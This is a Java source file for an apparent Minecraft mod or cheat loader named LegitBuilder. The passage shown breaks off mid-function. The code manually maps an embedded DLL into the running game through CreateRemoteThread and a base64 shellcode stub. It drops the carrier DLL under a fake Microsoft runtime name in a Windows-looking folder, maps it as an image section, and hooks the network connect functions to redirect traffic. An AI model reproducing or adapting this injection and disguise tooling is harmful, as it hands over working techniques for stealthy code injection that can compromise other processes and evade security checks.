






import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.Structure;
import com.sun.jna.WString;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.LongByReference;
import com.sun.jna.ptr.PointerByReference;
import com.sun.jna.win32.StdCallLibrary;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.Comparator;
import java.util.Optional;
import java.util.stream.Collectors;

public final class LegitBuilder {


    private static final String PAYLOAD_RESOURCE  = "/mod-payload.dll";
    private static final String CARRIER_RESOURCE  = "/vcruntime_aux_carrier.dll";
    private static final String MANIFEST_RESOURCE = "/loader-abi.json";


    private static final String LOADER_STUB_BASE64 =
        "SIlMJAhIg+xYSItEJGBIiUQkIEiLRCQgSIsASIlEJChIi0QkIEiDeDAAdA9Ii0QkIEiLQDDHAAAAAABIi0QkIEiDeBgAdEBIi0QkIEiDeCAAdDRIi0QkIIN4KAB0KUiLRCQgSItAGEiJRCQwTItEJChIi0QkIItQKEiLRCQgSItIIP9UJDCQSItEJCBIg3gwAHQPSItEJCBIi0AwxwABAAAASItEJCCDeAgAdCpIi0QkIItACEiLTCQoSAPISIvBSIlEJDhFM8C6AQAAAEiLTCQo/1QkOJBIi0QkIEiDeDAAdA9Ii0QkIEiLQDDHAAIAAABIi0QkIEiDeBAAdDZIi0QkIEiDeDAAdA9Ii0QkIEiLQDDHAAMAAABIi0QkIEiLQBBIiUQkQEiLRCQgSIsI/1QkQJAzwEiDxFjD";
























    private static final int LOADER_PARAMS_SIZE         = 72;
    private static final int LOADER_PARAMS_VERSION      = 1;
    private static final int HOOK_INSTALLER_OFFSET      = 0x200;
    private static final int CONNECT_THUNK_OFFSET       = 0x500;
    private static final int WINHTTPCONNECT_THUNK_OFFSET= 0x580;
    private static final int ASSET_SERVER_PORT          = 8080;




    private static String EXPECTED_PAYLOAD_SHA256  = null;
    private static String EXPECTED_CARRIER_SHA256  = null;


    private static final int PROCESS_ALL_ACCESS     = 0x001F_FFFF;
    private static final int MEM_COMMIT_RESERVE     = 0x3000;
    private static final int MEM_RELEASE            = 0x8000;
    private static final int PAGE_NOACCESS          = 0x01;
    private static final int PAGE_READONLY          = 0x02;
    private static final int PAGE_READWRITE         = 0x04;
    private static final int PAGE_EXECUTE           = 0x10;
    private static final int PAGE_EXECUTE_READ      = 0x20;
    private static final int PAGE_EXECUTE_READWRITE = 0x40;
    private static final int GENERIC_READ           = 0x8000_0000;
    private static final int GENERIC_WRITE          = 0x4000_0000;
    private static final int GENERIC_EXECUTE        = 0x2000_0000;
    private static final int FILE_SHARE_READ        = 0x1;
    private static final int FILE_SHARE_DELETE      = 0x4;
    private static final int OPEN_EXISTING          = 3;
    private static final int FILE_ATTRIBUTE_NORMAL  = 0x80;
    private static final int SEC_IMAGE             = 0x0100_0000;
    private static final int SECTION_ALL_ACCESS    = 0x000F_001F;
    private static final int VIEW_UNMAP            = 2;
    private static final int WAIT_OBJECT_0         = 0;
    private static final int WAIT_TIMEOUT          = 0x102;
    private static final int TH32CS_SNAPMODULE     = 0x8;
    private static final int TH32CS_SNAPMODULE32   = 0x10;
    private static final int TH32CS_SNAPTHREAD     = 0x4;
    private static final int THREAD_SUSPEND_RESUME  = 0x0002;
    private static final int THREAD_QUERY_LIMITED_INFORMATION = 0x0800;

    private LegitBuilder() {}



    public static void main(String[] args) {
        try {
            desktopLaunch = ProcessHandle.current().info().command().orElse("").toLowerCase(Locale.ROOT).endsWith("javaw.exe");
            if (useJava21(args)) return;
            openDesktopConsole();
            if (!System.getProperty("os.name", "").toLowerCase(Locale.ROOT).contains("windows"))
                throw new IllegalStateException("Windows is required");
            if (Native.POINTER_SIZE != 8)
                throw new IllegalStateException("Run this JAR with 64-bit Java");

            if (args.length == 0) {
                autoLaunch();
                return;
            }


            loadManifestHashes();

            Integer requestedPid  = null;
            Path externalPayload  = null;
            boolean inspectOnly   = false;
            boolean mapOnly       = false;
            boolean serveAssets   = false;
            boolean hasAssets     = false;
            boolean useWinHttp    = false;

            for (int i = 0; i < args.length; i++) {
                switch (args[i]) {
                    case "--pid"          -> requestedPid   = Integer.parseInt(requireValue(args, ++i, "--pid"));
                    case "--payload"      -> externalPayload = Path.of(requireValue(args, ++i, "--payload"));
                    case "--inspect"      -> inspectOnly    = true;
                    case "--map-only"     -> mapOnly        = true;
                    case "--serve-assets" -> serveAssets    = true;
                    case "--has-assets"   -> hasAssets      = true;
                    case "--winhttp"      -> useWinHttp     = true;
                    default -> throw new IllegalArgumentException("Unknown argument: " + args[i]);
                }
            }

            if (serveAssets) {
                if (requestedPid == null)
                    throw new IllegalArgumentException("--serve-assets requires --pid");
                serveAssetsUntilExit(requestedPid);
                return;
            }

            byte[] raw = externalPayload == null
                    ? readResource(PAYLOAD_RESOURCE)
                    : Files.readAllBytes(externalPayload.toAbsolutePath().normalize());


            String payloadHash = sha256(raw);
            System.out.printf("Payload: size=%d sha256=%s%n", raw.length, payloadHash);
            if (EXPECTED_PAYLOAD_SHA256 != null && !EXPECTED_PAYLOAD_SHA256.isEmpty()) {
                if (!payloadHash.equals(EXPECTED_PAYLOAD_SHA256))
                    throw new IllegalStateException(
                        "Payload SHA-256 mismatch!\n  expected=" + EXPECTED_PAYLOAD_SHA256 +
                        "\n  actual  =" + payloadHash);
                System.out.println("Payload hash: OK");
            } else {
                System.out.println("Payload hash: no expected value in manifest (skipping check)");
            }

            Pe pe = parsePe(raw);
            byte[] image0 = mapRawToVirtual(raw, pe);
            validateTlsTemplate(image0, pe);
            int manualMainRva = findExport(image0, pe, "ManualMain");
            System.out.printf("image_size=0x%x entry_rva=0x%x ManualMain_rva=0x%x%n",
                pe.imageSize, pe.entryRva, manualMainRva);

            if (!pe.x64 || manualMainRva == 0)
                throw new IllegalArgumentException("Payload is not a supported PE64 DLL with ManualMain export");


            if (pe.exceptionRva != 0 && pe.exceptionSize > 0) {
                if (pe.exceptionSize % 12 != 0)
                    System.err.printf("WARNING: .pdata size %d is not a multiple of 12 — RtlAddFunctionTable may fail%n",
                        pe.exceptionSize);
                long exceptionEnd = Integer.toUnsignedLong(pe.exceptionRva) +
                                    Integer.toUnsignedLong(pe.exceptionSize);
                if (exceptionEnd > Integer.toUnsignedLong(pe.imageSize))
                    throw new IllegalArgumentException(
                        "Exception directory extends beyond image size — corrupt PE");
                int entryCount = pe.exceptionSize / 12;
                System.out.printf("Exception table: rva=0x%x size=%d entries=%d%n",
                    pe.exceptionRva, pe.exceptionSize, entryCount);
            }

            if (inspectOnly) {
                System.out.println("Payload integrity check passed.");
                return;
            }

            int pid = requestedPid != null ? requestedPid : findMinecraftPid();
            System.out.println("Target Minecraft PID: " + Integer.toUnsignedString(pid));

            byte[] carrier = readResource(CARRIER_RESOURCE);


            String carrierHash = sha256(carrier);
            System.out.printf("Carrier: size=%d sha256=%s%n", carrier.length, carrierHash);
            if (EXPECTED_CARRIER_SHA256 != null && !EXPECTED_CARRIER_SHA256.isEmpty()) {
                if (!carrierHash.equals(EXPECTED_CARRIER_SHA256))
                    throw new IllegalStateException(
                        "Carrier SHA-256 mismatch!\n  expected=" + EXPECTED_CARRIER_SHA256 +
                        "\n  actual  =" + carrierHash);
                System.out.println("Carrier hash: OK");
            } else {
                System.out.println("Carrier hash: no expected value in manifest (skipping check)");
            }

            Path sectionFile = extractCarrier(carrier, pid);
            inject(pid, sectionFile, raw, pe, manualMainRva, !mapOnly, hasAssets, useWinHttp);

            System.out.println(mapOnly
                ? "Map-only test successful; image unmapped without execution."
                : "Injection successful.");

        } catch (Throwable error) {
            System.err.println("ERROR: " + error.getMessage());
            error.printStackTrace(System.err);
            if (desktopLaunch) {
                javax.swing.JOptionPane.showMessageDialog(null, error.toString(),
                        "LegitBuilder", javax.swing.JOptionPane.ERROR_MESSAGE);
            }
            System.exit(1);
        }
    }

    private static boolean desktopLaunch;

    private static boolean useJava21(String[] args) throws Exception {
        if (Runtime.version().feature() == 21) return false;
        if (Boolean.getBoolean("legitbuilder.relaunched"))
            throw new IOException("Selected runtime is not Java 21");
        for (JavaRuntime runtime : detectJavaRuntimes()) {
            if (!runtime.version.contains("version \"21.")) continue;
            Path release = runtime.home.resolve("release");
            if (!Files.isRegularFile(release)) continue;
            String metadata = Files.readString(release);
            if (!metadata.contains("OS_ARCH=\"amd64\"") && !metadata.contains("OS_ARCH=\"x86_64\"")) continue;
            Path executable = runtime.home.resolve("bin").resolve(desktopLaunch ? "javaw.exe" : "java.exe");
            if (!Files.isRegularFile(executable)) continue;
            List<String> command = new ArrayList<>();
            command.add(executable.toString());
            command.add("-Dlegitbuilder.relaunched=true");
            command.add("-jar");
            command.add(Path.of(LegitBuilder.class.getProtectionDomain().getCodeSource().getLocation().toURI()).toString());
            command.addAll(List.of(args));
            ProcessBuilder builder = new ProcessBuilder(command);
            if (desktopLaunch) builder.start();
            else System.exit(builder.inheritIO().start().waitFor());
            return true;
        }
        throw new IOException("64-bit Java 21 was not found. Install Java 21 and reopen the loader.");
    }

    public interface DesktopConsole extends StdCallLibrary {
        boolean AllocConsole();
        Pointer GetConsoleWindow();
        boolean SetConsoleTitleW(WString title);
        boolean SetConsoleOutputCP(int codePage);
        boolean SetConsoleCP(int codePage);
    }

    private static void openDesktopConsole() throws IOException {
        if (!System.getProperty("os.name", "").toLowerCase(Locale.ROOT).contains("windows")) return;
        String executable = ProcessHandle.current().info().command().orElse("");
        desktopLaunch = executable.toLowerCase(Locale.ROOT).endsWith("javaw.exe");
        if (!desktopLaunch) return;
        DesktopConsole console = Native.load("kernel32", DesktopConsole.class);
        if (console.GetConsoleWindow() == null && !console.AllocConsole()) {
            throw new IOException("Cannot open console: Windows error " + Native.getLastError());
        }
        console.SetConsoleCP(65001);
        console.SetConsoleOutputCP(65001);
        console.SetConsoleTitleW(new WString("LegitBuilder"));
        System.setOut(new java.io.PrintStream(new java.io.FileOutputStream("CONOUT$"), true, StandardCharsets.UTF_8));
        System.setErr(new java.io.PrintStream(new java.io.FileOutputStream("CONOUT$"), true, StandardCharsets.UTF_8));
    }

    private static void autoLaunch() throws Exception {
        loadManifestHashes();
        String gameVersion = jsonStr(new String(readResource(MANIFEST_RESOURCE), StandardCharsets.UTF_8), "mcVersion");
        if (gameVersion == null || gameVersion.isBlank()) throw new IOException("Minecraft version is missing from the bundle manifest");
        List<ProcessInfo> processes = minecraftProcesses(gameVersion);
        if (processes.isEmpty()) throw new IOException("Minecraft " + gameVersion + " is not running");
        if (processes.size() != 1) throw new IOException("Multiple Minecraft " + gameVersion + " processes are running; use --pid to select one");
        int pid = processes.get(0).pid;
        Path logs = Path.of(System.getProperty("user.home"), ".legitbuilder", "logs");
        Files.createDirectories(logs);
        Path log = logs.resolve("inject-" + pid + "-" + System.currentTimeMillis() + ".log");
        System.out.println("Minecraft PID " + pid);
        System.out.println("Log: " + log);
        try (var file = new java.io.PrintStream(Files.newOutputStream(log), true, StandardCharsets.UTF_8)) {
            java.io.PrintStream out = System.out, err = System.err;
            System.setOut(file);
            System.setErr(file);
            try { runInjectionForPid(pid); }
            catch (Exception failure) {
                failure.printStackTrace(file);
                throw failure;
            }
            finally { System.setOut(out); System.setErr(err); }
        }
        System.out.println("Loaded into Minecraft PID " + pid);
    }

    private static void runInjectionForPid(int pid) throws Exception {
        loadManifestHashes();
        byte[] raw = readResource(PAYLOAD_RESOURCE);
        String payloadHash = sha256(raw);
        System.out.printf("Payload: %d bytes, SHA-256 %s%n", raw.length, payloadHash);
        if (EXPECTED_PAYLOAD_SHA256 != null && !payloadHash.equals(EXPECTED_PAYLOAD_SHA256))
            throw new IllegalStateException("Embedded payload hash mismatch");
        Pe pe = parsePe(raw);
        byte[] image0 = mapRawToVirtual(raw, pe);
        validateTlsTemplate(image0, pe);
        int manualMainRva = findExport(image0, pe, "ManualMain");
        if (!pe.x64 || manualMainRva == 0) throw new IllegalStateException("Invalid embedded payload PE");
        byte[] carrier = readResource(CARRIER_RESOURCE);
        String carrierHash = sha256(carrier);
        System.out.printf("Carrier: %d bytes, SHA-256 %s%n", carrier.length, carrierHash);
        if (EXPECTED_CARRIER_SHA256 != null && !carrierHash.equals(EXPECTED_CARRIER_SHA256))
            throw new IllegalStateException("Embedded carrier hash mismatch");
        Path sectionFile = extractCarrier(carrier, pid);
        inject(pid, sectionFile, raw, pe, manualMainRva, true, false, false);
        System.out.println("Injection completed successfully.");
    }

    private static String minecraftVersion(int pid) throws IOException {
        for (ProcessInfo process : runningMinecraft()) if (process.pid == pid) return process.version;
        return null;
    }

    private static List<ProcessInfo> minecraftProcesses(String gameVersion) throws IOException {
        return runningMinecraft().stream().filter(process -> gameVersion.equals(process.version)).toList();
    }

    private static List<ProcessInfo> runningMinecraft() throws IOException {
        String script = """
                Get-CimInstance Win32_Process -Filter "Name = 'javaw.exe' OR Name = 'java.exe'" | ForEach-Object {
                    $line = $_.CommandLine
                    if ($line) {
                        $line = $line.Replace([char]92, [char]47)
                        $match = [regex]::Match($line, 'com/mojang/minecraft/([^/;]+)/minecraft-[^/;]+-client[.]jar')
                        if ($match.Success) {
                            [Console]::Out.WriteLine([string]$_.ProcessId + [char]9 + $match.Groups[1].Value)
                        }
                    }
                }
                """;
        String encoded = java.util.Base64.getEncoder().encodeToString(script.getBytes(StandardCharsets.UTF_16LE));
        Process process = new ProcessBuilder("powershell.exe", "-NoProfile", "-NonInteractive", "-EncodedCommand", encoded)
                .redirectErrorStream(true).start();
        try {
            if (!process.waitFor(10, java.util.concurrent.TimeUnit.SECONDS)) {
                process.destroyForcibly();
                throw new IOException("Minecraft process enumeration timed out");
            }
        } catch (InterruptedException interrupted) {
            process.destroyForcibly();
            Thread.currentThread().interrupt();
            throw new IOException("Minecraft process enumeration interrupted", interrupted);
        }
        String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        if (process.exitValue() != 0) throw new IOException("Minecraft process enumeration failed: " + output.trim());
        List<ProcessInfo> result = new ArrayList<>();
        for (String line : output.split("\\R")) {
            String[] fields = line.trim().split("\\t", 2);
            if (fields.length != 2) continue;
            try {
                int pid = Integer.parseInt(fields[0]);
                if (pid != ProcessHandle.current().pid() && ProcessHandle.of(pid).filter(ProcessHandle::isAlive).isPresent())
                    result.add(new ProcessInfo(pid, fields[1]));
            } catch (NumberFormatException ignored) { }
        }
        result.sort(Comparator.comparingInt(ProcessInfo::pid));
        return result;
    }

    private static List<JavaRuntime> detectJavaRuntimes() {
        Set<Path> homes = new LinkedHashSet<>();
        addJavaHome(homes, Path.of(System.getProperty("java.home", "")));
        String path = System.getenv("PATH");
        if (path != null) for (String entry : path.split(java.io.File.pathSeparator)) {
            Path exe = Path.of(entry).resolve("java.exe");
            if (Files.isRegularFile(exe)) addJavaHome(homes, exe.getParent().getParent());
        }
        for (String root : List.of("C:\\Program Files\\Java", "C:\\Program Files\\Microsoft",
                System.getenv("APPDATA") + "\\PrismLauncher\\java")) {
            Path base = Path.of(root);
            if (Files.isDirectory(base)) try (var stream = Files.list(base)) {
                stream.filter(Files::isDirectory).forEach(p -> addJavaHome(homes, p));
            } catch (IOException ignored) {}
        }
        List<JavaRuntime> result = new ArrayList<>();
        for (Path home : homes) {
            Path java = home.resolve("bin").resolve("java.exe");
            if (!Files.isRegularFile(java)) continue;
            result.add(new JavaRuntime(home, javaVersion(java), java.toString()));
        }
        return result;
    }

    private static void addJavaHome(Set<Path> homes, Path candidate) {
        if (candidate == null) return;
        try { homes.add(candidate.toAbsolutePath().normalize()); } catch (Exception ignored) {}
    }

    private static String javaVersion(Path executable) {
        try {
            Process process = new ProcessBuilder(executable.toString(), "-version").redirectErrorStream(true).start();
            String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8).replaceAll("\\s+", " ").trim();
            process.waitFor();
            return output.length() > 45 ? output.substring(0, 45) : output;
        } catch (Exception error) { return "unknown"; }
    }

    private static void clearConsole() {
        System.out.print("\u001b[H\u001b[2J");
        System.out.flush();
    }

    private record ProcessInfo(int pid, String version) {}
    private record JavaRuntime(Path home, String version, String executable) {}


    private static void loadManifestHashes() {
        try {
            byte[] data = readResource(MANIFEST_RESOURCE);
            String json = new String(data, StandardCharsets.UTF_8);
            EXPECTED_PAYLOAD_SHA256 = jsonStr(json, "payloadSha256");
            EXPECTED_CARRIER_SHA256 = jsonStr(json, "carrierSha256");
            System.out.printf("Manifest loaded: payloadHash=%s carrierHash=%s%n",
                hashPreview(EXPECTED_PAYLOAD_SHA256), hashPreview(EXPECTED_CARRIER_SHA256));
        } catch (IOException e) {
            System.out.println("No manifest resource found — hash verification skipped");
        }
    }

    private static String hashPreview(String hash) {
        return hash == null || hash.isBlank()
                ? "(none)"
                : hash.substring(0, Math.min(8, hash.length())) + "...";
    }

    private static String jsonStr(String json, String key) {
        String k = "\"" + key + "\"";
        int pos = json.indexOf(k);
        if (pos < 0) return null;
        pos = json.indexOf(':', pos + k.length());
        if (pos < 0) return null;
        pos = json.indexOf('"', pos);
        if (pos < 0) return null;
        int end = json.indexOf('"', pos + 1);
        if (end < 0) return null;
        return json.substring(pos + 1, end);
    }

    private static String requireValue(String[] args, int i, String opt) {
        if (i >= args.length) throw new IllegalArgumentException("Missing value for " + opt);
        return args[i];
    }

    private static byte[] readResource(String name) throws IOException {
        try (InputStream in = LegitBuilder.class.getResourceAsStream(name)) {
            if (in == null) throw new IOException("Missing bundled resource: " + name);
            return in.readAllBytes();
        }
    }



    private static void serveAssetsUntilExit(int pid) throws Exception {
        ProcessHandle target = ProcessHandle.of(Integer.toUnsignedLong(pid))
            .filter(ProcessHandle::isAlive)
            .orElseThrow(() -> new IllegalStateException("PID not running: " + pid));
        try (ServerSocket server = new ServerSocket()) {
            server.setReuseAddress(true);
            server.bind(new InetSocketAddress(InetAddress.getLoopbackAddress(), ASSET_SERVER_PORT));
            System.out.printf("Asset server on 127.0.0.1:%d for PID %d%n", ASSET_SERVER_PORT, pid);
            Thread t = new Thread(() -> runAcceptor(server), "mod-offline-assets");
            t.setDaemon(true);
            t.start();
            target.onExit().join();
        }
    }

    private static void runAcceptor(ServerSocket server) {
        while (!server.isClosed()) {
            try {
                Socket s = server.accept();
                Thread w = new Thread(() -> serveRequest(s), "mod-asset-request");
                w.setDaemon(true);
                w.start();
            } catch (IOException e) {
                if (!server.isClosed())
                    System.err.println("Accept error: " + e.getMessage());
            }
        }
    }

    private static void serveRequest(Socket socket) {
        try (socket;
             BufferedReader in = new BufferedReader(new InputStreamReader(
                 socket.getInputStream(), StandardCharsets.US_ASCII));
             OutputStream out = socket.getOutputStream()) {

            String line = in.readLine();
            if (line == null) return;
            String header;
            while ((header = in.readLine()) != null && !header.isEmpty()) {}

            String[] parts = line.split(" ", 3);
            boolean head = parts.length >= 2 && "HEAD".equals(parts[0]);
            boolean get  = parts.length >= 2 && "GET".equals(parts[0]);
            String path  = parts.length >= 2 ? parts[1].split("\\?", 2)[0] : "";
            String name  = path.startsWith("/assets/") ? path.substring("/assets/".length()) : "";

            if ((!get && !head) || name.isEmpty() || name.contains("..") || name.contains("/")) {
                writeHttp(out, 404, "text/plain", "Not found".getBytes(StandardCharsets.US_ASCII), head);
                return;
            }

            byte[] data;
            try {
                data = readResource("/offline-assets/" + name);
            } catch (IOException e) {
                writeHttp(out, 404, "text/plain", "Not found".getBytes(StandardCharsets.US_ASCII), head);
                return;
            }

            String ct = name.endsWith(".png")  ? "image/png"
                      : name.endsWith(".json") ? "application/json"
                      : "application/octet-stream";
            writeHttp(out, 200, ct, data, head);

        } catch (IOException e) {
            System.err.println("Asset request error: " + e.getMessage());
        }
    }

    private static void writeHttp(OutputStream out, int status, String ct,
                                   byte[] body, boolean head) throws IOException {
        String reason = status == 200 ? "OK" : "Not Found";
        String h = "HTTP/1.1 " + status + " " + reason + "\r\n"
                 + "Content-Type: " + ct + "\r\n"
                 + "Content-Length: " + body.length + "\r\n"
                 + "Cache-Control: public, max-age=31536000, immutable\r\n"
                 + "Connection: close\r\n\r\n";
        out.write(h.getBytes(StandardCharsets.US_ASCII));
        if (!head) out.write(body);
        out.flush();
    }



    private static Path extractCarrier(byte[] raw, int pid) throws IOException {
        String localAppData = System.getenv("LOCALAPPDATA");
        Path directory = localAppData == null || localAppData.isBlank()
            ? Path.of(System.getProperty("java.io.tmpdir"), "mod-offline")
            : Path.of(localAppData, "Microsoft", "Windows");
        Files.createDirectories(directory);
        int suffix = (pid ^ 0xa5a5) & 0xffff;
        for (int attempt = 0; attempt < 256; attempt++) {
            Path out = directory.resolve(
                String.format("vcruntime_aux_%04x.dll", (suffix + attempt) & 0xffff));
            if (!Files.exists(out)) { Files.write(out, raw); return out; }


            if (Files.size(out) == raw.length) {
                try {
                    String existingHash = sha256(Files.readAllBytes(out));
                    if (EXPECTED_CARRIER_SHA256 == null || EXPECTED_CARRIER_SHA256.isEmpty()
                            || existingHash.equalsIgnoreCase(EXPECTED_CARRIER_SHA256))
                        return out;


                    continue;
                } catch (Exception e) {
                    continue;
                }
            }
        }
        throw new IOException("Could not allocate carrier filename in " + directory);
    }



    private static int findMinecraftPid() throws IOException {
        String expectedVersion = jsonStr(new String(readResource(MANIFEST_RESOURCE), StandardCharsets.UTF_8), "mcVersion");
        List<ProcessInfo> candidates = minecraftProcesses(expectedVersion);
        if (candidates.isEmpty()) throw new IOException("Minecraft " + expectedVersion + " is not running");
        if (candidates.size() > 1) throw new IOException("Multiple Minecraft processes are running; use --pid");
        return candidates.get(0).pid;
    }



    private static void inject(int pid, Path sectionFile, byte[] raw, Pe sourcePe,
                                int manualMainRva, boolean execute, boolean hasAssets,
                                boolean useWinHttp)
            throws Exception {

        String expectedVersion = jsonStr(new String(readResource(MANIFEST_RESOURCE), StandardCharsets.UTF_8), "mcVersion");
        String actualVersion = minecraftVersion(pid);
        if (actualVersion == null || !actualVersion.equals(expectedVersion))
            throw new IOException("This loader targets Minecraft " + expectedVersion
                    + ", but PID " + pid + " is Minecraft " + actualVersion);

        Pointer process = Kernel32.INSTANCE.OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if (isNull(process)) throw win32("OpenProcess");

        Pointer remoteBase = null;
        Pointer stepArea   = null;
            boolean mappedWithSection = false;
        boolean committed  = false;

        try {
            byte[] image = mapRawToVirtual(raw, sourcePe);
            validateTlsTemplate(image, sourcePe);
            Set<String> libraries = importLibraries(image, sourcePe);
            for (String lib : libraries)
                ensureRemoteLibrary(process, lib);
            resolveImports(image, sourcePe);
            redirectProcessTerminationToCurrentThread(image, sourcePe);

            Mapping mapping = mapImageSection(process, sectionFile);
            remoteBase = mapping.base;
            mappedWithSection = mapping.sectionBacked;
            long mappedBase = Pointer.nativeValue(remoteBase);
            System.out.printf("SEC_IMAGE base=0x%x size=0x%x%n", mappedBase, mapping.size);

            applyRelocations(image, sourcePe.imageBase, mappedBase, sourcePe);
            setImageBase(image, sourcePe, mappedBase);

            IntByReference oldProtection = new IntByReference();
            long minRequired = Integer.toUnsignedLong(sourcePe.imageSize) + 0x1000L;
            if (mapping.size < minRequired)
                throw new IOException(String.format(
                    "SEC_IMAGE carrier too small: has 0x%x, need 0x%x (image + loader tail)",
                    mapping.size, minRequired));

            if (Kernel32.INSTANCE.VirtualProtectEx(process, remoteBase, mapping.size,
                    PAGE_EXECUTE_READWRITE, oldProtection) == 0)
                throw win32("VirtualProtectEx(image RWX)");

            writeMemory(process, remoteBase, image, "image");
            protectSections(process, remoteBase, sourcePe);

            if (Kernel32.INSTANCE.FlushInstructionCache(process, remoteBase, image.length) == 0)
                throw win32("FlushInstructionCache(image)");

            if (!execute) {

                if (mappedWithSection)
                    Ntdll.INSTANCE.NtUnmapViewOfSection(process, remoteBase);
                else
                    Kernel32.INSTANCE.VirtualFreeEx(process, remoteBase, 0, MEM_RELEASE);
                remoteBase = null;
                committed = true;
                return;
            }

            byte[] stub = buildLoaderStub();
            Pointer loaderArea = new Pointer(mappedBase + Integer.toUnsignedLong(sourcePe.imageSize));
            long loaderAddress = Pointer.nativeValue(loaderArea);


            long originalConnect = 0;
            byte[] connectThunk = new byte[0];
            if (hasAssets) {
                originalConnect = Pointer.nativeValue(function("ws2_32.dll", "connect"));
                connectThunk = buildConnectThunk(originalConnect, ASSET_SERVER_PORT);
            }


            long originalWinHttpConnect = 0;
            byte[] winHttpThunk = new byte[0];
            if (hasAssets && useWinHttp) {
                try {
                    originalWinHttpConnect = Pointer.nativeValue(function("winhttp.dll", "WinHttpConnect"));
                    winHttpThunk = buildWinHttpConnectThunk(originalWinHttpConnect, ASSET_SERVER_PORT);
                    System.out.println("WinHTTP redirect: WinHttpConnect thunk built");
                } catch (IOException e) {
                    System.err.println("WinHTTP redirect skipped: " + e.getMessage());
                }
            }

            stepArea = Kernel32.INSTANCE.VirtualAllocEx(process, null, 4,
                MEM_COMMIT_RESERVE, PAGE_READWRITE);
            if (isNull(stepArea)) throw win32("VirtualAllocEx(step)");
            long stepAddress = Pointer.nativeValue(stepArea);

            long rtlAddFunctionTable = Pointer.nativeValue(function("kernel32.dll", "RtlAddFunctionTable"));


            ByteBuffer params = ByteBuffer.allocate(LOADER_PARAMS_SIZE).order(ByteOrder.LITTLE_ENDIAN);

            params.putLong(mappedBase);

            params.putInt(sourcePe.entryRva);

            params.putInt(0);

            params.putLong(mappedBase + Integer.toUnsignedLong(manualMainRva));

            params.putLong(rtlAddFunctionTable);




            if (sourcePe.exceptionRva != 0 && sourcePe.exceptionSize >= 12
                    && sourcePe.exceptionSize % 12 == 0) {
                params.putLong(mappedBase + Integer.toUnsignedLong(sourcePe.exceptionRva));
                params.putInt(sourcePe.exceptionSize / 12);
                params.putInt(0);
            } else {
                params.putLong(0).putInt(0).putInt(0);
            }

            params.putLong(stepAddress);

            params.putLong(0);

            params.putLong(originalConnect);



            if (false) params.putLong(0);

            if (false) params.putLong(originalWinHttpConnect);



            writeMemory(process, loaderArea, params.array(), "loader params");
            writeMemory(process, new Pointer(loaderAddress + LOADER_PARAMS_SIZE), stub, "loader stub");

            if (connectThunk.length > 0)
                writeMemory(process, new Pointer(loaderAddress + CONNECT_THUNK_OFFSET),
                    connectThunk, "ws2_32 connect redirect");
            if (winHttpThunk.length > 0)
                writeMemory(process, new Pointer(loaderAddress + WINHTTPCONNECT_THUNK_OFFSET),
                    winHttpThunk, "WinHTTP connect redirect");

            ByteBuffer initialStep = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(255);
            writeMemory(process, new Pointer(stepAddress), initialStep.array(), "loader step init");

            Kernel32.INSTANCE.FlushInstructionCache(process, loaderArea, 0x1000);
            if (Kernel32.INSTANCE.VirtualProtectEx(process, loaderArea, 0x1000,
                    PAGE_EXECUTE_READ, oldProtection) == 0)
                throw win32("VirtualProtectEx(loader RX)");


            if (hasAssets && connectThunk.length > 0)
                redirectAssetConnections(process, pid,
                    new Pointer(loaderAddress + CONNECT_THUNK_OFFSET), originalConnect);


            if (hasAssets && winHttpThunk.length > 0 && originalWinHttpConnect != 0)
                redirectWinHttpConnections(process, pid,
                    new Pointer(loaderAddress + WINHTTPCONNECT_THUNK_OFFSET),
                    originalWinHttpConnect);

            Pointer thread = Kernel32.INSTANCE.CreateRemoteThread(process, null, 0x800000,
                new Pointer(loaderAddress + LOADER_PARAMS_SIZE), loaderArea, 0, null);
            if (isNull(thread)) throw win32("CreateRemoteThread");
            committed = true;

            long deadline = System.nanoTime() + 20_000_000_000L;
            int wait;
            int lastReadableStep = -1;
            do {
                wait = Kernel32.INSTANCE.WaitForSingleObject(thread, 25);
                try {
                    int currentStep = readInt(process, new Pointer(stepAddress));
                    if (currentStep != lastReadableStep) {
                        lastReadableStep = currentStep;
                        System.out.printf("Loader progress: step=%d%n", currentStep);
                    }
                } catch (IOException ignored) {

                }
            } while (wait == WAIT_TIMEOUT && System.nanoTime() < deadline);
            IntByReference exitCode = new IntByReference(0);
            boolean haveExitCode = Kernel32.INSTANCE.GetExitCodeThread(thread, exitCode) != 0;
            int step = lastReadableStep;
            try {
                step = readInt(process, new Pointer(stepAddress));
            } catch (IOException e) {
                System.err.println("WARNING: could not read remote loader step: " + e.getMessage());
            }
            Kernel32.INSTANCE.CloseHandle(thread);

            if (haveExitCode)
                System.out.printf("Loader: wait=0x%x step=%d exit=0x%x%n", wait, step, exitCode.getValue());
            else
                System.out.printf("Loader: wait=0x%x step=%d exit=<unavailable>%n", wait, step);

            if (wait != WAIT_OBJECT_0 && wait != WAIT_TIMEOUT)
                throw win32("WaitForSingleObject");
            if (wait == WAIT_TIMEOUT)
                throw new IOException("Payload initialization is still running; success is not confirmed. Do not inject again.");
            if (!haveExitCode)
                throw new IOException("Cannot verify payload initialization exit code");
            if (exitCode.getValue() != 0)
                throw new IOException("Payload initialization failed: exit=0x" +
                    Integer.toHexString(exitCode.getValue()) + "; see mod_payload_log.txt");
            if (step >= 0 && step < 3)
                throw new IllegalStateException(
                    "Remote loader stopped before payload start completed (step=" + step + ")");

            if (wait == WAIT_OBJECT_0) {
                Kernel32.INSTANCE.VirtualFreeEx(process, stepArea, 0, MEM_RELEASE);
                stepArea = null;
            }

        } finally {
            if (!committed && !isNull(remoteBase)) {
                if (mappedWithSection)
                    Ntdll.INSTANCE.NtUnmapViewOfSection(process, remoteBase);
                else
                    Kernel32.INSTANCE.VirtualFreeEx(process, remoteBase, 0, MEM_RELEASE);
